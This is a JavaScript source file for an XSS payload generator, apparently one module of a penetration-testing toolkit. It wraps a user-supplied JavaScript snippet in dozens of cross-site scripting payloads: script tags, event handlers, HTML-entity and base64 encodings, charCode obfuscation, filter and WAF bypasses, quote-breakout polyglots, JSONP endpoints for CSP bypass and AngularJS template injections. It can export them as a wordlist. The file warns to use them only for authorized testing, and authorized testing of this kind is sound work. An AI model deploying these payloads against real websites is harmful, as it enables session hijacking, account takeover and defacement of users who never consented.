// ========================================
// XSS PAYLOAD GENERATOR
// Category: Purple Team
// Same visual style as SQLi tool
// ========================================

(function () {
    'use strict';

    function render() {
        return `
        <div class="section-header">
            <h3 class="mb-1 d-flex align-items-center gap-2">
                <i class="bi bi-bug-fill"></i>
                <span>XSS Payload Generator</span>
            </h3>
            <p class="text-secondary mb-0">
              Generate XSS proof-of-concept payloads for authorized security testing.
              JavaScript is taken from the field below and inserted into each payload
              <em>where applicable</em>.
            </p>
        </div>

        <div class="alert alert-warning">
            <i class="bi bi-exclamation-triangle-fill"></i>
            <strong>Warning:</strong>
            Use these payloads only for authorized security testing and educational purposes.
        </div>

        <div class="mb-3">
            <label for="xssInput" class="form-label">JavaScript code</label>
            <input 
                type="text" 
                class="form-control font-monospace" 
                id="xssInput" 
                placeholder="alert(document.domain)" 
                value="alert(document.domain)">
            <small class="text-secondary">
                Enter a valid JavaScript snippet (statements or expressions, <strong>no &lt;script&gt; tags</strong>).
                The tool will validate it before generating payloads.
            </small>
        </div>

        <div class="mb-3">
            <label class="form-label">Payload categories</label>
            <div class="row">
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catBasic" checked>
                        <label class="form-check-label" for="catBasic">Basic script tags</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catEvent" checked>
                        <label class="form-check-label" for="catEvent">Event handlers (img/svg/div)</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catEncoded" checked>
                        <label class="form-check-label" for="catEncoded">Encoded / data: / javascript:</label>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catObfuscated" checked>
                        <label class="form-check-label" for="catObfuscated">Obfuscated / charCode</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catFilter" checked>
                        <label class="form-check-label" for="catFilter">Filter bypass tricks</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catCsp" checked>
                        <label class="form-check-label" for="catCsp">CSP / JSONP snippets</label>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catPolyglot" checked>
                        <label class="form-check-label" for="catPolyglot">Polyglots / quote breakouts</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catWaf" checked>
                        <label class="form-check-label" for="catWaf">WAF bypass variants</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="catAngular" checked>
                        <label class="form-check-label" for="catAngular">Angular / template payloads</label>
                    </div>
                </div>
            </div>
        </div>

        <button class="btn btn-success" id="xssGenerateBtn">
            <i class="bi bi-hammer"></i> Generate payloads
        </button>

        <button class="btn btn-outline-info ms-2 d-none" id="xssCopyAllBtn">
            <i class="bi bi-clipboard"></i> Copy all
        </button>

        <button class="btn btn-outline-warning ms-2 d-none" id="xssDownloadBtn">
            <i class="bi bi-download"></i> Download wordlist
        </button>

        <div id="xssResults" class="mt-4"></div>
    `;
    }

    function init() {
        let currentPayloads = [];

        function getBaseJs() {
            return (document.getElementById('xssInput').value || '').trim();
        }

        // Simple JavaScript validation: parses but does not execute
        function validateJs(code) {
            if (!code) {
                return { ok: false, error: 'Empty JavaScript snippet.' };
            }
            try {
                // eslint-disable-next-line no-new-func
                new Function(code);
                return { ok: true };
            } catch (e) {
                return { ok: false, error: e.message || 'Syntax error in JavaScript code.' };
            }
        }

        function escapeAttr(str) {
            return str
                .replace(/&/g, '&amp;')
                .replace(/"/g, '&quot;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
        }

        // PAT-inspired helpers which still respect the "base JS" where possible.
        function buildPatInspiredPayloads(baseJs, baseJsSingleEsc, baseJsDoubleEsc, categories) {
            const extra = [];

            // ========= PAT Filter Bypass Highlights =========
            if (categories.filter) {
                extra.push({
                    category: 'Filter Bypass (PAT-inspired)',
                    hint: 'Alternate evaluation and alert-disguising tricks, inspired by PayloadsAllTheThings filter bypass section.',
                    items: [
                        `javascript:eval(''+${JSON.stringify('eval(' + JSON.stringify(baseJs) + ')')})`,
                        `<script>constructor.constructor('${baseJsSingleEsc}')()</script>`,
                        `<script>[].filter.constructor('${baseJsSingleEsc}')()</script>`,
                        `<script>window['eval']('${baseJsSingleEsc}')</script>`,
                        '＜script＞' + baseJs + '＜/script＞'
                    ]
                });
            }

            // ========= PAT Polyglot Highlights =========
            if (categories.polyglot) {
                extra.push({
                    category: 'Static Polyglots (PAT classics)',
                    hint: 'Classic multi-context XSS polyglots from PayloadsAllTheThings. They usually hard-code alert(1) and do NOT use the Base JS field.',
                    items: [
                        `jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oncliCk=alert(1) )//%0D%0A//<svg/onload=alert(1)>`,
                        `"-->@example.com'-->"><svg/onload=alert(1)>`
                    ]
                });
            }

            // ========= PAT WAF Bypass Highlights =========
            if (categories.waf) {
                extra.push({
                    category: 'Common WAF Bypass (PAT-inspired)',
                    hint: 'Minor formatting and case tricks inspired by PayloadsAllTheThings WAF bypass section.',
                    items: [
                        `<img src=x onerror=/*x*/${baseJs}>`,
                        `<img src=x onerror=${baseJs}//`,
                        `<svg onload=${baseJs}//`,
                        `<svg oNlOad=${baseJs}>`,
                        `<script>onerror=function(e){${baseJs}};throw 1</script>`
                    ]
                });
            }

            // ========= PAT CSP Bypass Highlights =========
            if (categories.csp) {
                extra.push({
                    category: 'CSP / JSONP Snippets (PAT highlights)',
                    hint: 'Use when CSP whitelists specific JSONP endpoints. These examples are static; adapt manually and ignore the Base JS field here.',
                    items: [
                        `//google.com/complete/search?client=chrome&jsonp=alert(1);`,
                        `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`,
                        `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert(1);`,
                        `https://www.youtube.com/oembed?callback=alert`
                    ]
                });
            }

            // ========= PAT Angular / Template Payloads =========
            if (categories.angular) {
                extra.push({
                    category: 'Angular / AngularJS Template Payloads',
                    hint: 'Short AngularJS template injection primitives based on PayloadsAllTheThings. Require an AngularJS context (e.g. ng-app on page).',
                    items: [
                        `{{constructor.constructor('${baseJsSingleEsc}')()}}`,
                        `{{$eval.constructor('${baseJsSingleEsc}')()}}`,
                        `{{[].pop.constructor('${baseJsSingleEsc}')()}}`
                    ]
                });
            }

            return extra;
        }

        function generatePayloads() {
            const resultsDiv = document.getElementById('xssResults');
            const copyAllBtn = document.getElementById('xssCopyAllBtn');
            const downloadBtn = document.getElementById('xssDownloadBtn');

            const baseJs = getBaseJs();
            const validation = validateJs(baseJs);

            const categories = {
                basic:    document.getElementById('catBasic').checked,
                event:    document.getElementById('catEvent').checked,
                encoded:  document.getElementById('catEncoded').checked,
                obfuscated: document.getElementById('catObfuscated').checked,
                filter:   document.getElementById('catFilter').checked,
                polyglot: document.getElementById('catPolyglot').checked,
                waf:      document.getElementById('catWaf').checked,
                csp:      document.getElementById('catCsp').checked,
                angular:  document.getElementById('catAngular').checked
            };

            if (!validation.ok) {
                resultsDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <i class="bi bi-x-circle-fill"></i>
                        Invalid JavaScript: <code>${window.escapeHtml(validation.error)}</code><br>
                        <small>Tip: paste only JS (e.g. <code>alert(document.domain)</code>), not HTML.</small>
                    </div>
                `;
                currentPayloads = [];
                copyAllBtn.classList.add('d-none');
                downloadBtn.classList.add('d-none');
                return;
            }

            if (!Object.values(categories).some(Boolean)) {
                resultsDiv.innerHTML = `
                    <div class="alert alert-warning">
                        <i class="bi bi-exclamation-circle-fill"></i>
                        Please select at least one payload category.
                    </div>
                `;
                currentPayloads = [];
                copyAllBtn.classList.add('d-none');
                downloadBtn.classList.add('d-none');
                return;
            }

            const payloads = [];
            const baseJsSingleEsc = baseJs.replace(/'/g, "\\'");
            const baseJsDoubleEsc = baseJs.replace(/"/g, '\\"');

            // ===== BASIC SCRIPT TAGS =====
            if (categories.basic) {
                payloads.push({
                    category: 'Basic Script Tags',
                    hint: 'Use when you can inject raw HTML between tags.',
                    items: [
                        `<script>${baseJs}</script>`,
                        `<script>/*--></script><script>${baseJs}</script>`,
                        `<script>${baseJs}//</script>`,
                        `<script>${baseJs}</script><!--`,
                        `<SCRIPT>${baseJs}</SCRIPT>`,
                        `<ScRiPt>${baseJs}</ScRiPt>`,
                        `<script type="text/javascript">${baseJs}</script>`,
                        `<script language="javascript">${baseJs}</script>`,
                        `<scr<script>ipt>${baseJs}</scr<script>ipt>`,
                        `<script>eval('${baseJsSingleEsc}')</script>`,
                        `<script src="data:text/javascript,${encodeURIComponent(baseJs)}"></script>`
                    ]
                });
            }

            // ===== EVENT HANDLERS =====
            if (categories.event) {
                payloads.push({
                    category: 'Event Handler Payloads',
                    hint: 'Use when you control attributes like onerror/onload/onmouseover.',
                    items: [
                        `<img src=x onerror=${baseJs}>`,
                        `<img src=x onerror="${baseJsDoubleEsc}">`,
                        `<img src=x onerror='${baseJsSingleEsc}'>`,
                        `<body onload=${baseJs}>`,
                        `<svg onload=${baseJs}></svg>`,
                        `<svg/onload=${baseJs}>`,
                        `<iframe onload=${baseJs}></iframe>`,
                        `<input autofocus onfocus=${baseJs}>`,
                        `<select autofocus onfocus=${baseJs}></select>`,
                        `<textarea onfocus=${baseJs} autofocus></textarea>`,
                        `<div onmouseover=${baseJs}>hover me</div>`,
                        `<div onpointerover="${baseJsDoubleEsc}">MOVE HERE</div>`,
                        `<div onpointerdown="${baseJsDoubleEsc}">MOVE HERE</div>`,
                        `<div onpointerenter="${baseJsDoubleEsc}">MOVE HERE</div>`,
                        `<details open ontoggle=${baseJs}>`,
                        `<video src=x onerror=${baseJs}></video>`,
                        `<a onmouseover="${baseJsDoubleEsc}">hover</a>`
                    ]
                });
            }

            // ===== ENCODED / DATA / JAVASCRIPT: =====
            if (categories.encoded) {
                const htmlEncoded = baseJs.split('').map(c => '&#' + c.charCodeAt(0) + ';').join('');
                const hexHtmlEncoded = baseJs.split('').map(
                    c => '&#x' + c.charCodeAt(0).toString(16) + ';'
                ).join('');

                payloads.push({
                    category: 'Encoded / URI / data: Payloads',
                    hint: 'Useful when filters block some characters or only allow limited schemas.',
                    items: [
                        `<img src=x onerror="${htmlEncoded}">`,
                        `<img src=x onerror="${hexHtmlEncoded}">`,
                        `<img src=x onerror="eval(atob('${btoa(baseJs)}'))">`,
                        `<iframe src="javascript:${encodeURIComponent(baseJs)}"></iframe>`,
                        `<a href="javascript:${encodeURIComponent(baseJs)}">click</a>`,
                        `<iframe src="data:text/html,<script>${encodeURIComponent(baseJs)}</script>"></iframe>`,
                        `<object data="data:text/html,<script>${encodeURIComponent(baseJs)}</script>"></object>`,
                        `<embed src="data:text/html,<script>${encodeURIComponent(baseJs)}</script>"></embed>`,
                        `<object data="jav&#x61;sc&#x72;ipt:${baseJs}"></object>`
                    ]
                });
            }

            // ===== OBFUSCATED / CHARCODE =====
            if (categories.obfuscated) {
                const charCodes = baseJs.split('').map(c => c.charCodeAt(0)).join(',');
                payloads.push({
                    category: 'Obfuscated Payloads',
                    hint: 'Helps against naive signature filters (e.g. direct "alert" detection).',
                    items: [
                        `<script>eval(String.fromCharCode(${charCodes}))</script>`,
                        `<script>_='${baseJsSingleEsc}';eval(_)</script>`,
                        `<script>0['constructor']['constructor']('${baseJsSingleEsc}')()</script>`,
                        `<img src=x onerror="window">`,
                        `<svg id="${baseJsDoubleEsc}" onload="eval(this.id)"></svg>`
                    ]
                });
            }

            // ===== FILTER BYPASS / ODD HTML SHAPES =====
            if (categories.filter) {
                payloads.push({
                    category: 'Filter Bypass Techniques',
                    hint: 'Try when output is filtered or tags/keywords are partially blocked.',
                    items: [
                        `<scr<script>ipt>${baseJs}</scr</script>ipt>`,
                        `<script><!--${baseJs}--></script>`,
                        `<image src=x onerror=${baseJs}></image>`,
                        `<svg/onload=${baseJs}>`,
                        `<img/src=x/onerror=${baseJs}>`,
                        `<svg><script>${baseJs}</script></svg>`,
                        `<svg><script>${baseJs}</script>`,
                        `<body onload=${baseJs}>`,
                        `<details open ontoggle=${baseJs}>`,
                        `<iframe srcdoc="<script>${baseJsDoubleEsc}</script>"></iframe>`
                    ]
                });
            }

            // ===== POLYGLOTS / QUOTE BREAKOUTS =====
            if (categories.polyglot) {
                payloads.push({
                    category: 'Polyglot / Breakout Payloads',
                    hint: 'Good when you inject inside attributes or text that is then quoted.',
                    items: [
                        `"><img src=x onerror=${baseJs};>`,
                        `"><script>${baseJs}</script>`,
                        `'--></script><script>${baseJs}</script>`,
                        `'><script>${baseJs}</script>`,
                        `" autofocus onfocus="${baseJsDoubleEsc}" x="`,
                        `XSS"><svg/onload=${baseJs}>`
                    ]
                });
            }

            // ===== WAF BYPASS VARIANTS =====
            if (categories.waf) {
                payloads.push({
                    category: 'WAF Bypass Variants',
                    hint: 'Minor formatting changes to evade naive regex/WAF signatures.',
                    items: [
                        `<script     >${baseJs}</script>`,
                        `<ScRiPt>${baseJs}</ScRiPt>`,
                        `<svg/onload=${baseJs}>`,
                        `<svg      onload=${baseJs}>`,
                        `<svg///////onload=${baseJs}>`,
                        `<img src=1 onerror=${baseJs}>`,
                        `<img src=1 oNeRRor=${baseJs}>`,
                        `<details open ontoggle=${baseJs}>`,
                        `<script>onerror=function(e){${baseJs}};throw 1</script>`
                    ]
                });
            }

            // ===== PAT-INSPIRED EXTRA CATEGORIES =====
            const patExtra = buildPatInspiredPayloads(
                baseJs,
                baseJsSingleEsc,
                baseJsDoubleEsc,
                categories
            );

            patExtra.forEach(cat => payloads.push(cat));

            currentPayloads = payloads;

            if (!payloads.length) {
                resultsDiv.innerHTML = `
                    <div class="alert alert-info">
                        <i class="bi bi-info-circle-fill"></i>
                        No payloads generated. Check your category selections.
                    </div>
                `;
                copyAllBtn.classList.add('d-none');
                downloadBtn.classList.add('d-none');
                return;
            }

            // -------- RENDER RESULTS (same style as SQLi tool) --------
            let html = '<div class="accordion" id="xssAccordion">';
            let totalPayloads = 0;

            payloads.forEach((category, idx) => {
                totalPayloads += category.items.length;
                const collapseId = `xssCollapse${idx}`;
                const isFirst = idx === 0;

                html += `
                <div class="accordion-item" style="background-color: var(--terminal-card); border-color: var(--terminal-border);">
                    <h2 class="accordion-header">
                        <button class="accordion-button ${isFirst ? '' : 'collapsed'}" type="button" data-bs-toggle="collapse" data-bs-target="#${collapseId}" style="background-color: rgba(0, 255, 136, 0.15); color: var(--terminal-accent); border-color: var(--terminal-accent);">
                            <i class="bi bi-folder-fill me-2"></i> ${category.category} (${category.items.length} payloads)
                        </button>
                    </h2>
                    <div id="${collapseId}" class="accordion-collapse collapse ${isFirst ? 'show' : ''}" data-bs-parent="#xssAccordion">
                        <div class="accordion-body" style="background-color: var(--terminal-card);">
                            <p class="text-secondary small mb-3">${category.hint}</p>
                `;

                category.items.forEach(payload => {
                    html += `
                    <div class="mb-2">
                        <div class="code-block position-relative" style="background-color: var(--terminal-surface); padding: 12px; border-radius: 6px; border: 1px solid var(--terminal-border);">
                            <code class="text-break" style="color: var(--terminal-accent);">${window.escapeHtml(payload)}</code>
                            <button class="btn btn-sm btn-outline-success position-absolute top-0 end-0 m-1 xss-copy-payload-btn" data-payload-text="${escapeAttr(payload)}">
                                <i class="bi bi-clipboard"></i>
                            </button>
                        </div>
                    </div>
                `;
                });

                html += `
                        </div>
                    </div>
                </div>
                `;
            });

            html += '</div>';

            html = `
            <div class="alert alert-success mb-3">
                <i class="bi bi-check-circle-fill"></i> Generated <strong>${totalPayloads}</strong> XSS payloads.
                <br>
                <small class="text-light">
                    Base JS: <code>${window.escapeHtml(baseJs)}</code>
                    <br>
                    <em>Note:</em> some classic polyglot / CSP snippets are static and ignore the Base JS field by design.
                </small>
            </div>
            ` + html;

            resultsDiv.innerHTML = html;

            copyAllBtn.classList.remove('d-none');
            downloadBtn.classList.remove('d-none');
            
            // Copy single XSS payload
document.querySelectorAll('.xss-copy-payload-btn').forEach(btn => {
    btn.addEventListener('click', function () {
        // get payload from the <code> element text
        const codeEl = this.closest('.code-block')?.querySelector('code');
        const payload = codeEl ? codeEl.textContent : '';

        const textarea = document.createElement('textarea');
        textarea.value = payload;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);

        // animation: outline-success -> solid success, then back
        const originalHtml = this.innerHTML;
        this.innerHTML = '<i class="bi bi-check-circle-fill"></i>';
        this.classList.remove('btn-outline-success');
        this.classList.add('btn-success');

        setTimeout(() => {
            this.innerHTML = originalHtml;
            this.classList.remove('btn-success');
            this.classList.add('btn-outline-success');
        }, 2000);
    });
});
        }

        function copyAllPayloads() {
            if (currentPayloads.length === 0) {
                alert('Please generate payloads first.');
                return;
            }

            const allPayloads = [];
            currentPayloads.forEach(category => {
                category.items.forEach(payload => {
                    allPayloads.push(payload);
                });
            });

            const textarea = document.createElement('textarea');
            textarea.value = allPayloads.join('\n');
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);

            const btn = document.getElementById('xssCopyAllBtn');
            const originalHtml = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check-fill"></i> Copied!';
            btn.classList.remove('btn-info');
            btn.classList.add('btn-success');
            setTimeout(() => {
                btn.innerHTML = originalHtml;
                btn.classList.remove('btn-success');
                btn.classList.add('btn-info');
            }, 2000);
        }

        function downloadWordlist() {
            if (currentPayloads.length === 0) {
                alert('Please generate payloads first.');
                return;
            }

            const allPayloads = [];
            currentPayloads.forEach(category => {
                category.items.forEach(payload => {
                    allPayloads.push(payload);
                });
            });

            const content = allPayloads.join('\n');
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'xss-payloads-wordlist.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            const btn = document.getElementById('xssDownloadBtn');
            const originalHtml = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check-fill"></i> Downloaded!';
            btn.classList.remove('btn-warning');
            btn.classList.add('btn-success');
            setTimeout(() => {
                btn.innerHTML = originalHtml;
                btn.classList.remove('btn-success');
                btn.classList.add('btn-warning');
            }, 2000);
        }

        document.getElementById('xssGenerateBtn').addEventListener('click', generatePayloads);
        document.getElementById('xssCopyAllBtn').addEventListener('click', copyAllPayloads);
        document.getElementById('xssDownloadBtn').addEventListener('click', downloadWordlist);
    }

    window.registerCyberSuiteTool({
        id: 'xss-payload-generator',
        name: 'XSS Payloads Generator',
        description: 'Generate multiple XSS payloads for security testing and penetration testing',
        icon: 'bi-bug-fill',
        category: 'red',
        render: render,
        init: init
    });
})();